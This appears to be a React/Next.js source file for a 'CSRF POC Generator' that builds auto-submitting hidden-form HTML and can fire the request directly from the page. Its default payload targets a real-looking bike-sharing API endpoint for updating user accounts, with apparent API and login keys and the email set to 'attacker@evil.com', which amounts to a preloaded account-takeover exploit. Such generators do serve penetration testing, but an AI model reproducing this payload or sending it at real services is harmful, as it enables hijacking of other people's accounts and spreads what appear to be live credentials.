'use client';

import { useState, useEffect } from 'react';

export default function Home() {
  const [payload, setPayload] = useState({
    action: 'http://api.nextbike.net/api/updateUser.xml',
    method: 'POST',
    params: [
      { name: 'apikey', value: 'VzFxVgTA5K8Rsk1F' },
      { name: 'loginkey', value: '8L9aJf61u58G9Ts3' },
      { name: 'email', value: 'attacker@evil.com' }
    ]
  });

  const [generatedHTML, setGeneratedHTML] = useState('');
  const [testResult, setTestResult] = useState<{ status: number; response: string } | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Function to parse HTML and extract form data
  const parseHTML = (html: string) => {
    try {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const form = doc.querySelector('form');
      
      if (form) {
        const action = form.getAttribute('action') || '';
        const method = form.getAttribute('method')?.toUpperCase() || 'POST';
        const inputs = form.querySelectorAll('input[type="hidden"]');
        
        const params = Array.from(inputs).map(input => ({
          name: input.getAttribute('name') || '',
          value: input.getAttribute('value') || ''
        }));

        setPayload({
          action,
          method,
          params
        });
      }
    } catch (error) {
      console.error('Error parsing HTML:', error);
    }
  };

  // Generate HTML from form data
  const generateHTML = () => {
    const html = `
<html>
  <body>
    <form action="${payload.action}" method="${payload.method}">
      ${payload.params.map(param => 
        `<input type="hidden" name="${param.name}" value="${param.value}" />`
      ).join('\n      ')}
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>`;

    setGeneratedHTML(html);
  };

  // Update HTML when form data changes
  useEffect(() => {
    if (payload.params.length > 0) {
      generateHTML();
    }
  }, [payload]);

  const addParam = () => {
    setPayload(prev => ({
      ...prev,
      params: [...prev.params, { name: '', value: '' }]
    }));
  };

  const removeParam = (index: number) => {
    setPayload(prev => ({
      ...prev,
      params: prev.params.filter((_, i) => i !== index)
    }));
  };

  const updateParam = (index: number, field: 'name' | 'value', value: string) => {
    setPayload(prev => ({
      ...prev,
      params: prev.params.map((param, i) => 
        i === index ? { ...param, [field]: value } : param
      )
    }));
  };

  const testPayload = async () => {
    setIsLoading(true);
    setTestResult(null);

    try {
      const formData = new FormData();
      payload.params.forEach(param => {
        formData.append(param.name, param.value);
      });

      const response = await fetch(payload.action, {
        method: payload.method,
        body: formData,
        mode: 'no-cors'
      });

      setTestResult({
        status: response.status,
        response: await response.text()
      });
    } catch (error) {
      setTestResult({
        status: 0,
        response: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-primary text-white">
      <div className="container">
        <div className="py-12">
          <div className="flex justify-between items-center mb-12">
            <h1 className="text-3xl font-primary text-accent tracking-wider">CSRF POC Generator</h1>
            <button
              onClick={testPayload}
              disabled={!generatedHTML || isLoading}
              className="h-[48px] px-8 bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold uppercase tracking-[2px] text-sm disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Testing...' : 'Test Payload'}
            </button>
          </div>
          
          <div className="grid grid-cols-2 gap-8">
            {/* Left Column - Form Fields */}
            <div className="space-y-8">
              <div>
                <input
                  type="text"
                  value={payload.action}
                  onChange={(e) => setPayload(prev => ({ ...prev, action: e.target.value }))}
                  placeholder="Target URL"
                  className="w-full h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
                />
              </div>

              <div>
                <select
                  value={payload.method}
                  onChange={(e) => setPayload(prev => ({ ...prev, method: e.target.value }))}
                  className="w-full h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
                >
                  <option value="POST">POST</option>
                  <option value="GET">GET</option>
                </select>
              </div>

              <div>
                <div className="flex justify-between items-center mb-6">
                  <h2 className="font-primary text-accent text-xl tracking-wider">Parameters</h2>
                  <button
                    onClick={addParam}
                    className="h-[44px] px-6 bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold"
                  >
                    Add Param
                  </button>
                </div>
                
                {payload.params.map((param, index) => (
                  <div key={index} className="flex gap-4 mb-4">
                    <input
                      type="text"
                      value={param.name}
                      onChange={(e) => updateParam(index, 'name', e.target.value)}
                      placeholder="Name"
                      className="flex-1 h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
                    />
                    <input
                      type="text"
                      value={param.value}
                      onChange={(e) => updateParam(index, 'value', e.target.value)}
                      placeholder="Value"
                      className="flex-1 h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
                    />
                    <button
                      onClick={() => removeParam(index)}
                      className="h-[44px] w-[44px] bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold flex items-center justify-center"
                    >
                      ×
                    </button>
                  </div>
                ))}
              </div>
            </div>

            {/* Right Column - HTML Editor */}
            <div className="space-y-8">
              <div className="bg-primary/50 p-8 rounded-2xl border border-accent">
                <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">HTML Payload:</h2>
                <textarea
                  value={generatedHTML}
                  onChange={(e) => {
                    setGeneratedHTML(e.target.value);
                    parseHTML(e.target.value);
                  }}
                  className="w-full h-[400px] p-6 bg-primary rounded-xl text-sm font-mono border border-accent focus:border-accent-hover focus:outline-none transition-colors"
                  spellCheck="false"
                />
              </div>

              {/* Test Results */}
              {testResult && (
                <div className="bg-primary/50 p-8 rounded-2xl border border-accent">
                  <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">Test Results:</h2>
                  <div className="space-y-6">
                    <div className="flex items-center gap-2">
                      <span className="text-accent font-semibold">Status:</span>
                      <span className={`px-4 py-1 rounded-full text-sm font-semibold ${
                        testResult.status === 200 ? 'bg-green-500/20 text-green-500' : 'bg-red-500/20 text-red-500'
                      }`}>
                        {testResult.status}
                      </span>
                    </div>
                    <div>
                      <span className="text-accent font-semibold block mb-3">Response:</span>
                      <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
                        {testResult.response}
                      </pre>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}